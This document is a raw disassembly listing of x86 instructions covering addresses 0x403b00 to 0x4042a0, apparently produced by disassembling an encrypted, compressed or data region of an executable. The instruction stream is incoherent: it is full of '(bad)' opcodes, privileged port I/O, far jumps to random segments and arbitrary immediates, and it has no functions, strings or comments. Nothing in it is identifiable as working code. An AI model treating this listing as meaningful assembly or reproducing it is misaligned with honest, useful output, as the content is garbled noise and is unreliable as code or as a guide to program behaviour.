  403b00:	or     ch,BYTE PTR [ecx-0x49]
  403b03:	sahf   
  403b04:	jecxz  0x403b75
  403b06:	sub    ebx,edi
  403b08:	ds call 0x5f4204e8
  403b0e:	mov    bl,0x87
  403b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b11:	mov    al,ds:0xe8261da
  403b16:	leave  
  403b17:	mov    al,0x2e
  403b19:	jge    0x403af1
  403b1b:	jne    0x403ad6
  403b1d:	mov    ?,WORD PTR [ebx+esi*1+0x45]
  403b21:	mov    esi,0x4b3c06b3
  403b26:	ins    DWORD PTR es:[edi],dx
  403b27:	imul   edx,DWORD PTR [esi],0x13
  403b2a:	xchg   DWORD PTR [eax-0x156117c8],edx
  403b30:	sub    eax,0xa64f4db0
  403b35:	inc    ebp
  403b36:	nop
  403b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b38:	and    al,0x25
  403b3a:	rol    BYTE PTR [eax-0x1b880120],0x3c
  403b41:	inc    eax
  403b42:	fistp  WORD PTR [eax+esi*4]
  403b45:	cmp    eax,0xea4ceaf8
  403b4a:	sti    
  403b4b:	les    esi,FWORD PTR [esi+esi*8-0x1f]
  403b4f:	dec    eax
  403b50:	pushf  
  403b51:	pop    ecx
  403b52:	push   0xb
  403b54:	pushf  
  403b55:	loopne 0x403af5
  403b57:	sub    ah,0x89
  403b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b5b:	push   ds
  403b5c:	xor    dl,BYTE PTR [ebp+0x32]
  403b5f:	clc    
  403b60:	add    BYTE PTR [ebx],ch
  403b62:	jne    0x403b5d
  403b64:	gs in  al,dx
  403b66:	iret   
  403b67:	loopne 0x403b6d
  403b69:	sbb    BYTE PTR [esi-0x295eb2a8],al
  403b6f:	mov    WORD PTR [esi-0x432ae58a],fs
  403b75:	and    eax,0xf33b89b1
  403b7a:	cmp    esp,DWORD PTR [eax-0xfa8cd9d]
  403b80:	adc    ebx,DWORD PTR [ebp-0x41]
  403b83:	or     BYTE PTR [edi+0x2779335d],0xe6
  403b8a:	call   0x24a0:0xee920765
  403b91:	fwait
  403b92:	retf   
  403b93:	pop    es
  403b94:	jmp    0xf7f0:0x1409264
  403b9b:	div    BYTE PTR [ecx+0x51]
  403b9e:	(bad)  
  403b9f:	cmp    eax,eax
  403ba1:	jp     0x403bbe
  403ba3:	ror    BYTE PTR [eax-0x5156b867],1
  403ba9:	or     eax,0xab42387b
  403bae:	cmp    DWORD PTR [edx+0x40],0x6dfeb37
  403bb5:	add    eax,0xb54c087c
  403bba:	push   es
  403bbb:	mov    ebp,DWORD PTR [ebx]
  403bbd:	adc    eax,DWORD PTR [edi+0x439a5d5e]
  403bc3:	ror    DWORD PTR [edx+edx*1],0x74
  403bc7:	fcomp  DWORD PTR [ebx-0x3b]
  403bca:	or     eax,0x8c6e13de
  403bcf:	cdq    
  403bd0:	sti    
  403bd1:	lods   al,BYTE PTR ds:[esi]
  403bd2:	aas    
  403bd3:	aaa    
  403bd4:	mov    edx,0xe565f182
  403bd9:	sbb    eax,0x62f96b87
  403bde:	push   0x691b6f8e
  403be3:	retf   0x2f52
  403be6:	or     al,0x8e
  403be8:	inc    esi
  403be9:	push   edi
  403bea:	adc    eax,0xd9f0234f
  403bef:	ret    
  403bf0:	pop    es
  403bf1:	aam    0x67
  403bf3:	pop    esi
  403bf4:	lock sbb al,0x5f
  403bf7:	xchg   DWORD PTR [esi-0x58],ebp
  403bfa:	add    bl,BYTE PTR [esi]
  403bfc:	shl    BYTE PTR [eax-0xf],cl
  403bff:	shl    cl,cl
  403c01:	or     eax,0xbea0b5
  403c06:	push   0x5b6198c9
  403c0b:	push   es
  403c0c:	repnz or dl,BYTE PTR [eax+0x7985eda]
  403c13:	dec    esi
  403c14:	outs   dx,BYTE PTR ds:[esi]
  403c15:	(bad)  
  403c16:	fnstsw WORD PTR [ebp+0x25]
  403c19:	test   DWORD PTR [edx-0x786646a6],ebp
  403c1f:	ss mov bl,0xc9
  403c22:	imul   eax,DWORD PTR [esi+0x17],0xffffffd6
  403c26:	retf   
  403c27:	sub    al,0x2b
  403c29:	ins    DWORD PTR es:[edi],dx
  403c2a:	outs   dx,DWORD PTR ds:[esi]
  403c2b:	mov    ds:0x310639c0,al
  403c30:	aam    0x7e
  403c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c33:	push   ecx
  403c34:	shr    BYTE PTR [ebp+0x60a162f7],1
  403c3a:	push   eax
  403c3b:	inc    esp
  403c3c:	shr    BYTE PTR [esi+0x5e9d78c1],0xa3
  403c43:	cs scas al,BYTE PTR es:[edi]
  403c45:	jo     0x403bd2
  403c47:	push   eax
  403c48:	mov    al,dl
  403c4a:	fadd   DWORD PTR [eax]
  403c4c:	push   ss
  403c4d:	pop    es
  403c4e:	imul   DWORD PTR [ebx-0x26a0894]
  403c54:	cdq    
  403c55:	std    
  403c56:	scas   eax,DWORD PTR es:[edi]
  403c57:	xchg   ebp,eax
  403c58:	push   ds
  403c59:	nop
  403c5a:	les    eax,FWORD PTR gs:[ebx-0x30]
  403c5e:	pop    ebx
  403c5f:	xchg   esp,eax
  403c60:	jb     0x403c9e
  403c62:	fistp  QWORD PTR ds:0x2c17fbd2
  403c68:	sar    BYTE PTR [edx],1
  403c6a:	xchg   BYTE PTR [ebx-0x17],al
  403c6d:	mov    ebp,0xb2520b6e
  403c72:	(bad)  
  403c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c74:	pop    eax
  403c75:	pop    edi
  403c76:	cwde   
  403c77:	mov    ebx,0xc8a9fe9a
  403c7c:	xchg   DWORD PTR [ebp+0x79989106],ebp
  403c82:	inc    edi
  403c83:	cmp    al,0x52
  403c85:	dec    edi
  403c86:	in     eax,dx
  403c87:	jb     0x403c4d
  403c89:	add    eax,0x225b7ed6
  403c8e:	rol    cl,1
  403c90:	fild   QWORD PTR [eax+0x15]
  403c93:	addr16 js 0x403caa
  403c96:	sub    edx,DWORD PTR [edi]
  403c98:	inc    dl
  403c9a:	out    0x67,al
  403c9c:	push   ds
  403c9d:	lea    esi,[ebx+edx*4]
  403ca0:	in     al,dx
  403ca1:	xor    ah,BYTE PTR [edx+0xdc42a44]
  403ca7:	jbe    0x403d1a
  403ca9:	xlat   BYTE PTR ds:[ebx]
  403caa:	jns    0x403c62
  403cac:	test   al,0x3a
  403cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403caf:	popa   
  403cb0:	mov    BYTE PTR [ecx+0x7],bl
  403cb3:	ins    DWORD PTR es:[edi],dx
  403cb4:	sub    al,0x51
  403cb6:	std    
  403cb7:	pop    esp
  403cb8:	push   ecx
  403cb9:	std    
  403cba:	ins    DWORD PTR es:[edi],dx
  403cbb:	mov    edi,es
  403cbd:	and    edx,ecx
  403cbf:	popa   
  403cc0:	jp     0x403c4d
  403cc2:	loopne 0x403c55
  403cc4:	sub    dh,dl
  403cc6:	cmp    ch,BYTE PTR [ebx]
  403cc8:	mov    dh,0x9c
  403cca:	das    
  403ccb:	add    al,0x5c
  403ccd:	loopne 0x403d32
  403ccf:	adc    ecx,DWORD PTR [ebx]
  403cd1:	pop    ebp
  403cd2:	sti    
  403cd3:	data16 (bad) 
  403cd5:	dec    esi
  403cd6:	(bad)  
  403cd7:	jae    0x403c82
  403cd9:	sub    eax,0xcb281039
  403cde:	add    al,0xa3
  403ce0:	mov    cs,eax
  403ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce3:	adc    DWORD PTR ds:0xc2fa38f6,eax
  403ce9:	iret   
  403cea:	mov    ebx,eax
  403cec:	loope  0x403d4a
  403cee:	test   BYTE PTR ds:[edx+edi*1+0x7c846739],bh
  403cf6:	popa   
  403cf7:	cmp    BYTE PTR [edi-0x6c80200],bl
  403cfd:	sub    esi,edx
  403cff:	jae    0x403d03
  403d01:	push   esp
  403d02:	out    dx,eax
  403d03:	pop    esi
  403d04:	and    BYTE PTR [ebx],0xf2
  403d07:	adc    eax,0xe5f37fd5
  403d0c:	pop    edx
  403d0d:	pop    ebp
  403d0e:	or     ch,ch
  403d10:	or     DWORD PTR [esi+edx*8+0x55d8e25f],edx
  403d17:	jge    0x403d0b
  403d19:	daa    
  403d1a:	dec    esi
  403d1b:	fld    TBYTE PTR [ebx-0x1be2d758]
  403d21:	fnstcw WORD PTR [esi-0x51]
  403d24:	stc    
  403d25:	iret   
  403d26:	xchg   edi,eax
  403d27:	iret   
  403d28:	jle    0x403d0f
  403d2a:	adc    DWORD PTR [ecx+0x2f],ecx
  403d2d:	jnp    0x403d68
  403d2f:	js     0x403da3
  403d31:	mov    al,0xf5
  403d33:	xchg   DWORD PTR [esi+0xa],edi
  403d36:	lea    ebx,[edi+eiz*2-0x7]
  403d3a:	jbe    0x403cbf
  403d3c:	sbb    al,0x75
  403d3e:	push   eax
  403d3f:	inc    edi
  403d40:	sub    ch,BYTE PTR [edx]
  403d42:	les    ebx,FWORD PTR [eax+0x199b17f5]
  403d48:	mov    ch,0x7e
  403d4a:	add    al,0x85
  403d4c:	int    0x53
  403d4e:	dec    edx
  403d4f:	(bad)  
  403d50:	pop    es
  403d51:	ins    DWORD PTR es:[edi],dx
  403d52:	push   ss
  403d53:	sub    cl,BYTE PTR [edi-0x61]
  403d56:	out    dx,eax
  403d57:	cmp    esp,esp
  403d59:	xor    eax,0xd9424ff7
  403d5e:	das    
  403d5f:	mov    eax,ds:0x8b6259b5
  403d64:	push   0x5d
  403d66:	clc    
  403d67:	xor    BYTE PTR [ecx-0x60],ch
  403d6a:	repz cmp DWORD PTR [eax+0x45],0x4dabce65
  403d72:	ins    BYTE PTR es:[edi],dx
  403d73:	sbb    al,0x67
  403d75:	ss xor eax,0x22fc2ce6
  403d7b:	inc    edx
  403d7c:	push   cs
  403d7d:	fnstsw ax
  403d7f:	add    eax,0x62d87386
  403d84:	adc    BYTE PTR [ebp-0x35a9f50c],0x64
  403d8b:	fidiv  WORD PTR [eax+0x4b71457e]
  403d91:	xchg   esi,eax
  403d92:	xchg   ebp,eax
  403d93:	push   ds
  403d94:	loopne 0x403d98
  403d96:	dec    edi
  403d97:	outs   dx,BYTE PTR ds:[esi]
  403d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d99:	jo     0x403dee
  403d9b:	add    dl,BYTE PTR [ebx]
  403d9d:	add    DWORD PTR [ebx],edx
  403d9f:	rol    DWORD PTR [edx],cl
  403da1:	xchg   edi,eax
  403da2:	sar    ebp,0x32
  403da5:	lods   al,BYTE PTR ds:[esi]
  403da6:	and    eax,0xc7243d2b
  403dab:	cmc    
  403dac:	out    0x1,eax
  403dae:	dec    edx
  403daf:	add    DWORD PTR [edi+0x5],esi
  403db2:	dec    DWORD PTR [edi+0x7325bbb5]
  403db8:	(bad)  
  403db9:	cwde   
  403dba:	xor    edi,DWORD PTR [ebx+0x39]
  403dbd:	out    0x68,al
  403dbf:	mov    cs,WORD PTR [ebx]
  403dc1:	mov    dh,0xa5
  403dc3:	sub    edi,DWORD PTR [edi-0xbee1606]
  403dc9:	cmp    al,BYTE PTR [ebx+0x13]
  403dcc:	out    dx,al
  403dcd:	mov    al,ds:0xecd8c9ea
  403dd2:	scas   al,BYTE PTR es:[edi]
  403dd3:	cmp    BYTE PTR [ebp-0x12],cl
  403dd6:	fs pop edx
  403dd8:	ret    0x8237
  403ddb:	ja     0x403e12
  403ddd:	pop    es
  403dde:	and    al,0x65
  403de0:	stc    
  403de1:	retf   0x126e
  403de4:	outs   dx,DWORD PTR ds:[esi]
  403de5:	push   ebx
  403de6:	test   DWORD PTR ds:0xf9b34af4,edi
  403dec:	out    dx,eax
  403ded:	inc    ebp
  403dee:	inc    edi
  403def:	mov    eax,0x1c6cf055
  403df4:	mov    dl,bl
  403df6:	sti    
  403df7:	imul   ebp,ebx,0x4c7d5dc0
  403dfd:	fnstcw WORD PTR [eax+0x4d8cac09]
  403e03:	dec    eax
  403e04:	enter  0x7e9b,0x86
  403e08:	lods   eax,DWORD PTR ds:[esi]
  403e09:	xor    eax,ecx
  403e0b:	inc    esp
  403e0c:	mov    dh,0x1c
  403e0e:	push   ds
  403e0f:	adc    al,0x30
  403e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e12:	pop    bp
  403e14:	cwde   
  403e15:	xor    BYTE PTR [edi],bl
  403e17:	sbb    al,0x86
  403e19:	mov    al,0x5c
  403e1b:	jmp    0xdbb9e1d1
  403e20:	sub    DWORD PTR [ecx+0x6c],edi
  403e23:	jp     0x403e2a
  403e25:	and    bh,BYTE PTR [esi-0x51]
  403e28:	mov    ebp,0xfb6b78eb
  403e2d:	pop    ss
  403e2e:	rol    DWORD PTR [esi-0x71],cl
  403e31:	mov    BYTE PTR [edi],dh
  403e33:	test   al,0xaf
  403e35:	and    esi,edi
  403e37:	and    ch,BYTE PTR [eax+edi*8]
  403e3a:	inc    esi
  403e3b:	popf   
  403e3c:	jo     0x403dc0
  403e3e:	xchg   esp,eax
  403e3f:	and    BYTE PTR [ecx],dl
  403e41:	imul   eax,DWORD PTR [ebp-0x7],0x33c560e0
  403e48:	dec    ecx
  403e49:	pop    ss
  403e4a:	add    DWORD PTR [eax+0x7d20f6f7],ebp
  403e50:	lea    esp,[esi-0x6]
  403e53:	je     0x403e8f
  403e55:	push   ebp
  403e56:	push   ss
  403e57:	out    0xa7,eax
  403e59:	mov    ah,0x73
  403e5b:	sahf   
  403e5c:	xchg   esi,eax
  403e5d:	sbb    ecx,DWORD PTR [esi+0xa2d9f9]
  403e63:	jge    0x403e50
  403e65:	xor    eax,DWORD PTR [ecx]
  403e67:	nop
  403e68:	xchg   edx,eax
  403e69:	and    BYTE PTR [ebp-0x14],dl
  403e6c:	jle    0x403eb2
  403e6e:	ins    BYTE PTR es:[edi],dx
  403e6f:	out    0xb0,al
  403e71:	leave  
  403e72:	int3   
  403e73:	push   ss
  403e74:	mov    al,ds:0x439083b4
  403e79:	imul   edi,DWORD PTR [eax-0x3a],0xa3728b11
  403e80:	xchg   DWORD PTR [ebx-0x5e32c3e2],eax
  403e86:	push   esp
  403e87:	ret    
  403e88:	pop    ecx
  403e89:	nop
  403e8a:	xchg   esi,eax
  403e8b:	xchg   ebx,eax
  403e8c:	push   esi
  403e8d:	outs   dx,DWORD PTR ds:[esi]
  403e8e:	pop    edi
  403e8f:	enter  0x8f7e,0x69
  403e93:	mov    ch,0xd0
  403e95:	xor    al,0x94
  403e97:	pop    eax
  403e98:	mov    ebp,0xae850de2
  403e9d:	out    0x8e,al
  403e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea0:	xchg   esp,eax
  403ea1:	stc    
  403ea2:	xchg   ebx,eax
  403ea3:	mov    DWORD PTR [ebp-0x5cd23121],ebx
  403ea9:	xchg   ebx,eax
  403eaa:	jo     0x403f1b
  403eac:	jecxz  0x403f1b
  403eae:	dec    edi
  403eaf:	pop    esi
  403eb0:	jo     0x403e68
  403eb2:	inc    edx
  403eb3:	dec    ebp
  403eb4:	push   ss
  403eb5:	sti    
  403eb6:	xor    eax,0xb17637f7
  403ebb:	pop    ecx
  403ebc:	pushf  
  403ebd:	xor    eax,0x97aa8b92
  403ec2:	jecxz  0x403edc
  403ec4:	outs   dx,DWORD PTR ds:[esi]
  403ec5:	fwait
  403ec6:	lds    esi,FWORD PTR [ebx]
  403ec8:	pop    eax
  403ec9:	mov    dl,0x3a
  403ecb:	mov    edi,ecx
  403ecd:	jl     0x403e7c
  403ecf:	and    BYTE PTR [ecx],0xd9
  403ed2:	push   ss
  403ed3:	push   ds
  403ed4:	inc    ebp
  403ed5:	in     al,0xb4
  403ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed8:	cmp    esi,esi
  403eda:	int    0x7f
  403edc:	test   eax,0x36aac646
  403ee1:	ss xchg ecx,eax
  403ee3:	je     0x403e74
  403ee5:	out    dx,al
  403ee6:	jmp    0x81d0:0x760cbd77
  403eed:	sub    DWORD PTR [ebx],esp
  403eef:	inc    edi
  403ef0:	push   0xfffffff3
  403ef2:	pushf  
  403ef3:	push   0xffffffa2
  403ef5:	pop    esp
  403ef6:	or     eax,DWORD PTR [ecx]
  403ef8:	loopne 0x403ee1
  403efa:	pop    edi
  403efb:	cmp    al,0x75
  403efd:	leave  
  403efe:	mov    eax,0xc9cda1c9
  403f03:	sub    eax,0xe168b5f5
  403f08:	xchg   ecx,eax
  403f09:	pop    edi
  403f0a:	mov    ecx,0x3c4f7b4b
  403f0f:	and    edi,esp
  403f11:	hlt    
  403f12:	jb     0x403f19
  403f14:	div    dh
  403f16:	cdq    
  403f17:	fstp   QWORD PTR [ebp+edi*1+0x7e09bb91]
  403f1e:	sbb    dl,BYTE PTR [ebx]
  403f20:	sub    edi,DWORD PTR [esi+0x61]
  403f23:	adc    eax,0xda8bd799
  403f28:	sbb    al,0x5f
  403f2a:	dec    edx
  403f2b:	sbb    bh,BYTE PTR [edx-0x43]
  403f2e:	and    DWORD PTR [esi-0x7f68bec1],eax
  403f34:	inc    edi
  403f35:	sbb    ebp,DWORD PTR [esi+0xb]
  403f38:	call   0x56286d48
  403f3d:	outs   dx,DWORD PTR ds:[esi]
  403f3e:	daa    
  403f3f:	add    eax,0x57841bc9
  403f44:	jge    0x403f77
  403f46:	and    DWORD PTR [edx],ebp
  403f48:	mov    ch,0x4
  403f4a:	lahf   
  403f4b:	xchg   edi,eax
  403f4c:	inc    ebx
  403f4d:	or     bl,BYTE PTR [edi+edi*8+0x12]
  403f51:	dec    esi
  403f52:	mov    WORD PTR [esi],es
  403f54:	popf   
  403f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f57:	std    
  403f58:	or     eax,0x494bef1c
  403f5d:	cmp    ebx,edx
  403f5f:	inc    esp
  403f60:	call   0xfa6c21dc
  403f65:	xchg   DWORD PTR [eax],edx
  403f67:	jge    0x403f3c
  403f69:	inc    edi
  403f6a:	jl     0x403fe1
  403f6c:	mov    ds:0xfd878adc,al
  403f71:	in     al,0xf2
  403f73:	mov    al,ds:0x40212a24
  403f78:	push   ebx
  403f79:	add    eax,0xb7aa6416
  403f7e:	pop    eax
  403f7f:	dec    esp
  403f80:	inc    ebp
  403f81:	add    al,0x98
  403f83:	mov    al,ds:0x96496b1
  403f88:	sub    ch,BYTE PTR [ecx+ebx*1-0x54]
  403f8c:	inc    ebx
  403f8d:	xor    al,0x9c
  403f8f:	clc    
  403f90:	mov    ah,0xb6
  403f92:	cli    
  403f93:	lock out dx,al
  403f95:	out    dx,al
  403f96:	sub    ah,BYTE PTR ds:0x5d115549
  403f9c:	cmp    DWORD PTR [edx+0xc],edi
  403f9f:	jmp    0x403fb6
  403fa1:	pop    ebx
  403fa2:	ret    0x8904
  403fa5:	add    esp,DWORD PTR [esi-0x33]
  403fa8:	and    BYTE PTR [ebp+0x70],bl
  403fab:	and    al,0x3e
  403fad:	lods   eax,DWORD PTR ds:[esi]
  403fae:	mov    edx,0x61c5ddff
  403fb3:	ror    DWORD PTR [ecx+edi*2],1
  403fb6:	jmp    0x8a18f0a2
  403fbb:	lea    edx,ds:0x53848959
  403fc1:	ja     0x403f54
  403fc3:	push   ecx
  403fc4:	ret    
  403fc5:	pop    ds
  403fc6:	daa    
  403fc7:	imul   esi,ebp,0xc8ec88d1
  403fcd:	fisttp WORD PTR [ebp-0x6b773d86]
  403fd3:	cmc    
  403fd4:	ins    DWORD PTR es:[edi],dx
  403fd5:	lds    edx,FWORD PTR [ebx-0x65]
  403fd8:	fcomp  DWORD PTR [ebx+ebx*8+0x7]
  403fdc:	mov    ds:0xee5b183e,al
  403fe1:	or     al,0x42
  403fe3:	imul   esi,eax,0x8e96ee94
  403fe9:	mov    bh,0x76
  403feb:	into   
  403fec:	push   0x95e97bf5
  403ff1:	jnp    0x403f9e
  403ff3:	pop    ds
  403ff4:	xchg   edx,ebx
  403ff6:	jp     0x40401e
  403ff8:	jmp    FWORD PTR [ebp+0x6d2047f7]
  403ffe:	adc    ch,BYTE PTR [ecx-0x33]
  404001:	dec    ebx
  404002:	js     0x404000
  404004:	cmp    dh,BYTE PTR [ecx+0x13d83c9f]
  40400a:	ds loopne 0x403fba
  40400d:	aad    0x17
  40400f:	dec    esi
  404010:	fild   QWORD PTR [ecx]
  404012:	mov    bh,0xec
  404014:	out    0x60,eax
  404016:	push   eax
  404017:	lea    ebx,[ebp+0x46b43c22]
  40401d:	loop   0x404031
  40401f:	je     0x403fa9
  404021:	pop    eax
  404022:	pop    edi
  404023:	iret   
  404024:	push   es
  404025:	fild   QWORD PTR [eax+0x6f4d470b]
  40402b:	push   edi
  40402c:	pop    ss
  40402d:	scas   eax,DWORD PTR es:[edi]
  40402e:	dec    ecx
  40402f:	dec    ebx
  404030:	push   ebx
  404031:	inc    esp
  404032:	mov    edx,0x8ea26445
  404037:	fwait
  404038:	sbb    DWORD PTR [eax+0x16],esi
  40403b:	push   ebx
  40403c:	mov    ebx,0x20373946
  404041:	loopne 0x404002
  404043:	xchg   ebx,eax
  404044:	(bad)  
  404046:	cli    
  404047:	rcl    DWORD PTR [edx],cl
  404049:	and    ecx,DWORD PTR [edx+ecx*1+0x75]
  40404d:	mov    edi,0xd2afe5ff
  404052:	xor    DWORD PTR ds:[edi-0x3ca560e5],ebx
  404059:	lock es ds dec ecx
  40405d:	push   cs
  40405e:	arpl   WORD PTR [eax],bp
  404060:	enter  0x73fc,0x80
  404064:	push   esi
  404065:	js     0x403fea
  404067:	mov    ch,0x2b
  404069:	xor    dh,ch
  40406b:	loop   0x404056
  40406d:	div    DWORD PTR [esi+0x4]
  404070:	rcr    al,cl
  404072:	push   eax
  404073:	mov    ecx,0x30e6bf25
  404078:	fdiv   DWORD PTR [eax+0x0]
  40407b:	sbb    eax,0xb2975a0c
  404080:	mov    bl,0xce
  404082:	push   ebx
  404083:	loop   0x40400d
  404085:	xchg   DWORD PTR [ebp+0x347210fc],edx
  40408b:	in     al,dx
  40408c:	jl     0x404014
  40408e:	(bad)  
  40408f:	pop    edx
  404090:	dec    ebp
  404091:	mov    BYTE PTR [ebx+0x9],cl
  404094:	pusha  
  404095:	int3   
  404096:	call   0x8b72:0x61b02a6
  40409d:	jne    0x404033
  40409f:	or     DWORD PTR [esi-0x5d47ff90],esi
  4040a5:	retf   
  4040a6:	and    eax,0x17b72602
  4040ab:	outs   dx,BYTE PTR ds:[esi]
  4040ac:	in     eax,0xe9
  4040ae:	outs   dx,DWORD PTR ds:[esi]
  4040af:	pop    edi
  4040b0:	add    BYTE PTR [edx-0x6e45a503],ch
  4040b6:	arpl   WORD PTR [ebp+ebp*2+0x46ecca46],di
  4040bd:	mov    ah,0xa3
  4040bf:	push   ecx
  4040c0:	std    
  4040c1:	out    0xcb,eax
  4040c3:	stos   DWORD PTR es:[edi],eax
  4040c4:	scas   eax,DWORD PTR es:[edi]
  4040c5:	mov    esp,0x1aa67556
  4040ca:	pop    esi
  4040cb:	ret    
  4040cc:	lods   eax,DWORD PTR ds:[esi]
  4040cd:	out    dx,al
  4040ce:	sahf   
  4040cf:	inc    di
  4040d1:	mov    eax,DWORD PTR [ebx+0x61]
  4040d4:	mov    ecx,0x95268fc7
  4040d9:	inc    ebx
  4040da:	mov    bl,0x41
  4040dc:	jmp    0x9beb6d9b
  4040e1:	add    DWORD PTR [ebp+edi*4-0x4b6c4804],ebp
  4040e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040e9:	xlat   BYTE PTR ds:[ebx]
  4040ea:	push   esi
  4040eb:	lahf   
  4040ec:	push   ecx
  4040ed:	mov    dh,0x6
  4040ef:	and    bl,BYTE PTR [ebx-0x29d22d4]
  4040f5:	popa   
  4040f6:	or     eax,0xcd05994f
  4040fb:	sbb    DWORD PTR [eax],0xfffffff7
  4040fe:	and    DWORD PTR [edx+0x631c4ea],0x68db999d
  404108:	sbb    eax,edx
  40410a:	mov    bl,0x7
  40410c:	adc    BYTE PTR [ebx-0x5e8c3912],0x45
  404113:	pusha  
  404114:	pushf  
  404115:	push   ebp
  404116:	inc    ecx
  404117:	into   
  404118:	inc    eax
  404119:	fiadd  WORD PTR [edx+eiz*1-0x4886d207]
  404120:	xor    dl,bl
  404122:	push   edx
  404123:	add    dh,al
  404125:	(bad)  
  404126:	out    dx,eax
  404127:	ins    BYTE PTR es:[edi],dx
  404128:	aad    0x5
  40412a:	fcom   QWORD PTR [eax]
  40412c:	fucomi st,st(1)
  40412e:	mov    bl,bh
  404130:	mov    es,WORD PTR [ebp+0x14c5af1f]
  404136:	dec    ebx
  404137:	repnz add eax,0xcb47143c
  40413d:	mov    ebx,0xf0a544c0
  404142:	mov    eax,0xdc6791e5
  404147:	adc    bh,0x53
  40414a:	lahf   
  40414b:	jl     0x4041a6
  40414d:	and    al,0x71
  40414f:	cmp    esp,edx
  404151:	rcr    DWORD PTR [eax+0x7baece88],1
  404157:	and    eax,0x8e843a85
  40415c:	les    ebp,FWORD PTR [eax-0x7c]
  40415f:	add    eax,DWORD PTR [ebx]
  404161:	idiv   BYTE PTR [ecx]
  404163:	lahf   
  404164:	popa   
  404165:	das    
  404166:	mov    esi,0x2903e90e
  40416b:	dec    ecx
  40416c:	sub    BYTE PTR [edx],0x1f
  40416f:	xor    dh,cl
  404171:	inc    edi
  404172:	jmp    0xf07d69a3
  404177:	stos   BYTE PTR es:[edi],al
  404178:	sbb    ah,0xe1
  40417b:	cmp    BYTE PTR [edx],cl
  40417d:	sub    esp,esp
  40417f:	jp     0x4041ee
  404181:	jbe    0x404146
  404183:	sbb    al,0xdd
  404185:	mov    esi,0xd67c1092
  40418a:	out    0xf7,al
  40418c:	mov    eax,0x1c2556f3
  404191:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404193:	push   esp
  404194:	fwait
  404195:	aam    0xcf
  404197:	icebp  
  404198:	lea    eax,[eax+0x1fed07ce]
  40419e:	add    ebp,DWORD PTR [ecx+edi*4-0x57]
  4041a2:	mov    cl,0xc4
  4041a4:	ret    
  4041a5:	adc    al,0x9b
  4041a7:	outs   dx,DWORD PTR ds:[esi]
  4041a8:	sub    ecx,DWORD PTR [edx]
  4041aa:	push   edi
  4041ab:	and    al,BYTE PTR [esi]
  4041ad:	push   cs
  4041ae:	adc    BYTE PTR [edi+0x291affd6],0xd9
  4041b5:	ss xchg ebp,eax
  4041b7:	add    eax,0x5c1e0b1a
  4041bc:	mov    ds:0xe626c921,al
  4041c1:	scas   eax,DWORD PTR es:[edi]
  4041c2:	icebp  
  4041c3:	sti    
  4041c4:	mov    esi,0xa3d69c18
  4041c9:	imul   edi,DWORD PTR [esi],0xe8a5e392
  4041cf:	aam    0x6e
  4041d1:	cmp    eax,0x69996b7e
  4041d6:	mov    esi,DWORD PTR [esp+esi*4]
  4041d9:	imul   edx,DWORD PTR [eax],0xb903a635
  4041df:	push   0x69
  4041e1:	xlat   BYTE PTR ds:[ebx]
  4041e2:	lods   al,BYTE PTR ds:[esi]
  4041e3:	pop    eax
  4041e4:	dec    ebx
  4041e5:	fwait
  4041e6:	mov    ecx,0x90e77bfd
  4041eb:	and    eax,0xfcb85cf2
  4041f0:	(bad)  
  4041f1:	fstp   QWORD PTR [esi]
  4041f3:	or     ebp,edx
  4041f5:	or     eax,eax
  4041f7:	jns    0x404252
  4041f9:	ins    DWORD PTR es:[edi],dx
  4041fa:	inc    eax
  4041fb:	mov    eax,ds:0xa1eca5c1
  404200:	pop    ss
  404201:	mov    ecx,0x7fced576
  404206:	jge    0x404242
  404208:	xchg   esp,eax
  404209:	inc    esi
  40420a:	popa   
  40420b:	sub    al,0x86
  40420d:	rcl    BYTE PTR [ebp+0x52d5865d],cl
  404213:	inc    esi
  404214:	dec    eax
  404215:	test   BYTE PTR [ecx+0x4e],0x2e
  404219:	fist   DWORD PTR [ebp-0x16]
  40421c:	pusha  
  40421d:	inc    esi
  40421e:	std    
  40421f:	inc    eax
  404220:	sbb    al,0xc2
  404222:	jns    0x404293
  404224:	outs   dx,BYTE PTR ds:[esi]
  404225:	jle    0x4041b1
  404227:	ds int 0xb8
  40422a:	push   eax
  40422b:	es es add eax,0x9f63cd0d
  404232:	retf   
  404233:	outs   dx,DWORD PTR ds:[esi]
  404234:	(bad)  
  404235:	mov    al,0x68
  404237:	sbb    BYTE PTR [eax+0x4a],0x1e
  40423b:	int    0xe
  40423d:	call   0x848c:0xcfc2b36a
  404244:	rcr    bh,1
  404246:	adc    BYTE PTR [ebp+0x2f],ch
  404249:	mov    eax,ds:0x63b77fbb
  40424e:	mov    esp,0x8097441b
  404253:	or     ecx,DWORD PTR [ebp+0x29005d25]
  404259:	sub    DWORD PTR [ebp+0x45],0xffffffd6
  40425d:	jno    0x404296
  40425f:	cmp    DWORD PTR [ecx+0x31bef120],ebp
  404265:	lock mov ah,0x38
  404268:	mov    BYTE PTR [ebx-0x7e],0x4b
  40426c:	pushf  
  40426d:	mov    eax,0x164545d5
  404272:	add    dh,BYTE PTR [eax]
  404274:	hlt    
  404275:	call   0xed0a:0xcf3f0974
  40427c:	in     eax,0x61
  40427e:	xchg   ebp,eax
  40427f:	adc    al,0x88
  404281:	xor    dl,ah
  404283:	sbb    DWORD PTR ds:0xab56f358,edi
  404289:	sbb    bh,BYTE PTR [edx+0x1607e2a8]
  40428f:	pop    eax
  404290:	les    edx,FWORD PTR [esi+0x52]
  404293:	icebp  
  404294:	adc    ah,ah
  404296:	test   ecx,ebx
  404298:	xor    ah,BYTE PTR [edx+0x1f2af3c]
  40429e:	mov    es,WORD PTR [esi]
  4042a0:	mov    ebp,0xb234c6ca
